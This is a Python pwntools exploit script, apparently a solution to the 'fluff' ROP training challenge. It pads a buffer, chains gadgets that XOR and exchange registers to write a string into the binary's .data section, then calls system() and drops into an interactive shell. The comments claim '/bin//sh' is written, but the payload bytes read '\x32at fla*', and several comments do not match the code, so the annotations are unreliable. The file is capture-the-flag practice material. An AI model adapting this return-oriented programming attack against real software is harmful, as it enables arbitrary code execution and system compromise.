from pwn import *

context(arch='amd64', os='linux')
binary_name = 'fluff'
p =    process('./'+binary_name)
elf =  ELF(binary_name)
rop =  ROP(elf)

system =   elf.sym["system"] 
pop_rdi =  (rop.find_gadget(['pop rdi', 'ret']))[0]
# .data start address
writable_memory        = 0x601050
# 0x00000000004008bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_12_13_14_15        = 0x4008bc
# 0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret;
xor_r11r11_pop_14      = 0x400822
# 0x000000000040082d: pop r14; xor r11, r12; pop r12; mov r13d, 0x604060; ret;
pop14_xor_r11r12_pop12 = 0x40082d
# 0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
xchg_r11r10_pop15      = 0x400840
# 0x000000000040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
writewhatwhere         = 0x40084e
# Any value
garbage                = 0xcaaacaaa

rop =  "A"*40
### SET R10 = <.data address>
rop += p64(pop_12_13_14_15) + 4*(p64(writable_memory))      
# r11 = 0; r14 = garbage
rop += p64(xor_r11r11_pop_14) + p64(garbage)         
# r14 = "a"; r11 = r12; r12 = "a"
rop += p64(pop14_xor_r11r12_pop12) + 2*p64(writable_memory) 
# r10 = r10; r15 = garbage
rop += p64(xchg_r11r10_pop15) + p64(garbage)

# SET R11
# R12 = "/bin//sh"
rop += p64(pop_12_13_14_15) + "\x32at fla*" + 3*p64(garbage)
# r11 = 0; r14 = garbage
rop += p64(xor_r11r11_pop_14) + p64(garbage)
# r14 = "a"; r11 = r12; r12 = "a"
rop += p64(pop14_xor_r11r12_pop12) + 2*p64(garbage) #("/bin//sh")

# Write "/bin//sh" in <.data address>
rop += p64(writewhatwhere)
# system("/bin//sh")
rop += p64(pop_rdi) + p64(writable_memory+1) + p64(system)

log.info("System address (.plt) - " + hex(system))
log.info("Write-what-where      - " + hex(writewhatwhere))
log.info(".data section start   - " + hex(writable_memory))

p.recvuntil("> ")
p.send(rop)
p.interactive()